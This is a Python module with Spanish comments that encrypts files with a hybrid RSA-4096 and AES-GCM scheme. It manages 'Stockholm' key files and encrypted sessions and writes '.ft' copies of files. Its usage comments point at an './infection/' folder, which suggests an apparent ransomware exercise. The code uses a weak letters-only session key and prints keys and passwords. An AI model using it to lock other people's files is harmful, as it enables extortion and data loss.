import os, string, json, base64
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.Random import get_random_bytes
from Cryptodome.Protocol.KDF import PBKDF2
from secrets import choice
from hashlib import sha256

def random_string(length=32):
    '''
    https://docs.python.org/3/library/secrets.html
    '''
    alphabet = string.ascii_letters
    return ''.join(choice(alphabet) for i in range(length))

class krypt():
    '''
    Clase que gestiona las llaves de los algoritmos usados
    '''
    rsaprivkey_path = "KEY_Stockholm_KEY.pem"
    rsapubkey_path = "PUBLIC_KEY_Stockholm_PUBLIC_KEY.pem"
    ext = ".ft"
    def __init__(self, path=os.path.expanduser('~'), password_rsa=random_string()): 
        self.password_rsa = password_rsa
        print("Used password RSA:\n\t" + self.password_rsa + "\n")
        self.path = path if path.endswith("/") else path + "/"
        self.__rsaprivkey_path = self.path + self.rsaprivkey_path
        self.__rsapubkey_path = self.path + self.rsapubkey_path

    def get_extension(self):
        return self.ext

    def set_extension(self, ext):
        self.ext = "." + ext if not ext.startswith(".") else ext

    def set_path(self, path):
        self.path = path if path.endswith("/") else path + "/"
        self.__rsaprivkey_path = self.path + self.rsaprivkey_path
        self.__rsapubkey_path = self.path + self.rsapubkey_path
    
    def set_password_rsa(self, password):
        self.password_rsa = password

    def encode_session(self, session_password: str) -> dict:
        '''
        Encodificar llaves RSA y contraseña en un formato de sesión encriptada.
        Retorna un diccionario con los datos de sesión encriptados que pueden ser guardados en un archivo.
        
        Args:
            session_password: Contraseña maestra para encriptar la sesión
            
        Return:
            dict: 'version', 'salt', 'iv', 'ciphertext', 'tag' 
        '''
        try:
            # leer llaves generadas
            with open(self.__rsapubkey_path, "rb") as f:
                pub_key_data = f.read()
            with open(self.__rsaprivkey_path, "rb") as f:
                priv_key_data = f.read()
            
            # Crear un diccionario con las llaves y contraseña, y un timestamp obfuscando un poco
            session_data = {
                'public_key': base64.b64encode(pub_key_data).decode('utf-8'),
                'private_key': base64.b64encode(priv_key_data).decode('utf-8'),
                'password': self.password_rsa,
                'timestamp': str(__import__('datetime').datetime.now())
            }
            
            # Serializizar a JSON
            json_data = json.dumps(session_data).encode('utf-8')
            
            # Generar semilla and derivar llave desde contraseña de sesión
            salt = get_random_bytes(16)
            key = PBKDF2(session_password, salt, dkLen=32, count=100000, hmac_hash_module=sha256)
            
            # Encriptar con AES-256-GCM
            nonce = get_random_bytes(12)
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            ciphertext, tag = cipher.encrypt_and_digest(json_data)
            
            return {
                'version': '1.0',
                'salt': base64.b64encode(salt).decode('utf-8'),
                'iv': base64.b64encode(nonce).decode('utf-8'),
                'ciphertext': base64.b64encode(ciphertext).decode('utf-8'),
                'tag': base64.b64encode(tag).decode('utf-8')
            }
        except Exception as E:
            print(f"Error encodificando sesión: {str(E)}")
            return None

    def decode_session(self, session_data: dict, session_password: str) -> bool:
        '''
        Decodificar y restaurar una sesión desde datos de sesión encriptados.
        Actualiza la instancia de krypt con las llaves y contraseña restauradas.
        
        Args:
            session_data: dict with 'salt', 'iv', 'ciphertext', 'tag'
            session_password: Master password para descifrar la sesi'pon
            
        Return:
            bool: True if successful, False otherwise
        '''
        try:
            # Decode base64
            salt = base64.b64decode(session_data['salt'])
            iv = base64.b64decode(session_data['iv'])
            ciphertext = base64.b64decode(session_data['ciphertext'])
            tag = base64.b64decode(session_data['tag'])
            
            # Derivar desde contraseña
            key = PBKDF2(session_password, salt, dkLen=32, count=100000, hmac_hash_module=sha256)
            
            # Descifrar con AES-256-GCM
            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
            json_data = cipher.decrypt_and_verify(ciphertext, tag)
            
            # Parsear JSON
            session_info = json.loads(json_data.decode('utf-8'))
            
            # Restaurar llaves RSA
            pub_key_data = base64.b64decode(session_info['public_key'])
            priv_key_data = base64.b64decode(session_info['private_key'])
            
            with open(self.__rsapubkey_path, "wb") as f:
                f.write(pub_key_data)
            with open(self.__rsaprivkey_path, "wb") as f:
                f.write(priv_key_data)
            
            # Restaurar contraseña RSA
            self.password_rsa = session_info['password']
            
            print(f"Sesión restaurada del: {session_info['timestamp']}")
            return True
        except Exception as E:
            print(f"Error decodificando sesión: {str(E)}")
            return False

    def save_session(self, filename: str, session_password: str) -> bool:
        '''
        Guarda la sesión actual (llaves + contraseña) en un archivo encriptado.
        
        Args:
            filename: Path or nombre del archivo
            session_password: Master password para la sesion    
            
        Returns:
            bool: True con exito, False en caso de error
        '''
        try:
            session_data = self.encode_session(session_password)
            if session_data is None:
                return False
            
            with open(filename, "w") as f:
                json.dump(session_data, f, indent=2)
            
            print(f"Sesión guardada en: {filename}")
            return True
        except Exception as E:
            print(f"Error guardando sesión: {str(E)}")
            return False

    def load_session(self, filename: str, session_password: str) -> bool:
        '''
        Guarda y restaura una sesión actual (llaves + contraseña) desde un archivo encriptado.
        
        Args:
            filename: Path or nombre del archivo de sesión a cargar
            session_password: Master password para descifrar la sesión

        Returns:
            bool: True con exito, False en caso de error
        '''
        try:
            with open(filename, "r") as f:
                session_data = json.load(f)
            
            result = self.decode_session(session_data, session_password)
            if result:
                print(f"Sesión cargada desde: {filename}")
            return result
        except Exception as E:
            print(f"Error cargando sesión: {str(E)}")
            return False
    
    def generar_llaves_rsa(self):
        '''
        https://pycryptodome.readthedocs.io/en/latest/src/public_key/rsa.html#Crypto.PublicKey.RSA.RsaKey
        '''
        self.mysuperkey = RSA.generate(4096) # cambiar N
        tmpkey = None
        try:
            with open(self.__rsaprivkey_path, "wb") as f:
                key = self.mysuperkey.export_key(passphrase=self.password_rsa,
                                      pkcs=8,
                                      protection='PBKDF2WithHMAC-SHA512AndAES256-CBC',
                                      prot_params={'iteration_count':21000})
                tmpkey = str(key)
                f.write(key)
            print(f"\tLlave generada en '{self.__rsaprivkey_path}'.\n")
            print("=================================================================\n")
            print(tmpkey)
            print("\n=================================================================\n")
            self.exportar_llave_publica_rsa()
        except Exception as E:
            print(str(E))
    
    def exportar_llave_publica_rsa(self):
        with open(self.__rsapubkey_path, "wb") as f:
            pub = self.mysuperkey.public_key().export_key()
            f.write(pub)
        print(f"\tLlave pública exportada en '{self.__rsapubkey_path}'.\n")
        print("=================================================================\n")
        print(str(pub))
        print("\n=================================================================\n")
    
    def encrypt_data_RSA_OVER_AES(self, path: str, filename: str):
        '''
        https://pycryptodome.readthedocs.io/en/latest/src/examples.html#encrypt-data-with-rsa


        Necesito una llave publica RSA para encriptar la session_key, y una session_key para encriptar los datos con AES.
        Se puede descifrar

        '''
        path = path if path.endswith("/") else path + "/"
        try:
            with open(path+filename, "rb") as f:
                data = f.read()
        except FileNotFoundError:
            print(f"File not found: {path+filename}")
            return False
        except Exception as E:
            print("4Error: " + str(E))
            return False
        # Encriptar session_key con la llave publica RSA
        cliente_key = RSA.import_key(open(self.__rsapubkey_path).read())
        cipher_rsa = PKCS1_OAEP.new(cliente_key)

        session_key = random_string(16).encode() # AES-128
        enc_session_key = cipher_rsa.encrypt(session_key)

        # Encriptar los datos con el cifrado AES y session_key
        cipher_aes = AES.new(session_key, AES.MODE_GCM)
        ciphertext, tag = cipher_aes.encrypt_and_digest(data)
        try:
            with open(f"{path}{filename}{self.ext}", "wb") as f:
                f.write(enc_session_key) # !!!!!!!!!!!!
                f.write(cipher_aes.nonce) # !!!!!!!!!!!
                f.write(tag)         # !!!!!!!!!!!
                f.write(ciphertext)
        except Exception as E:
            print("4Error: " + str(E))
            return False
        return True
        

    def decrypt_data_RSA_OVER_AES(self, path:str, filename:str, rsaprivkey_path=None):
        '''
        Ver enlace en encrypt_data_RSA_OVER_AES
        Usa la llave privada RSA para descifrar la session_key, y luego usa esa session_key para descifrar los datos con AES.
        '''
        if rsaprivkey_path is not None:
            self.__rsaprivkey_path = rsaprivkey_path
        private_key = RSA.import_key(open(self.__rsaprivkey_path).read(), passphrase=self.password_rsa)
        path = path if path.endswith("/") else path + "/"
        try:
            with open(path + filename, "rb") as f:
                enc_session_key = f.read(private_key.size_in_bytes())
                nonce = f.read(16)
                tag = f.read(16)
                ciphertext = f.read()
        except FileNotFoundError:
            print(f"File not found: {path+filename}")
            return False
        except Exception as E:
            print("4Error: " + str(E))
            return False

        # Desencriptar la llave session con la llave privada RSA
        cipher_rsa = PKCS1_OAEP.new(private_key)
        session_key = cipher_rsa.decrypt(enc_session_key)

        # Desencriptar los datos con la llave AES
        cipher_aes = AES.new(session_key, AES.MODE_GCM, nonce)
        data = cipher_aes.decrypt_and_verify(ciphertext, tag)
        try:
            with open(path + filename[:-3], "wb") as f:
                f.write(data)
        except Exception as E:
            print("4Error: " + str(E))
            return False
        print(data.decode("utf-8"))
        return True

instancia = None

def alloc():
    global instancia
    if instancia is None:
        instancia = krypt("/home")
    return instancia


# ============================================================================
# EXAMPLE USAGE FOR SESSION ENCODING/DECODING
# ============================================================================
#
# 1. Generate keys and save session:
#    obj = krypt("/home", password_rsa="my_rsa_password")
#    obj.generar_llaves_rsa()
#    obj.save_session("my_session.json", "my_session_password")
#
# 2. Load session in another run:
#    obj = krypt("/home")
#    obj.load_session("my_session.json", "my_session_password")
#    # Now obj has the keys and password restored!
#
# 3. Encrypt/decrypt files with restored session:
#    obj.encrypt_data_RSA_OVER_AES("./infection/", "lol")
#    obj.decrypt_data_RSA_OVER_AES("./infection/", "lol.ft")
#
# ============================================================================
# # instancia = InstanciaSingletonKrypt()
# # instancia.generar_llaves_rsa()
# # ......
# # print("Encryption Result:")
# # print(obj.encrypt_data_RSA_OVER_AES("./infection/", "lol"))
# # print("=================================================================\n")
# # print("Decryption Result:")
# # print(obj.decrypt_data_RSA_OVER_AES("./infection/", "lol.ft"))

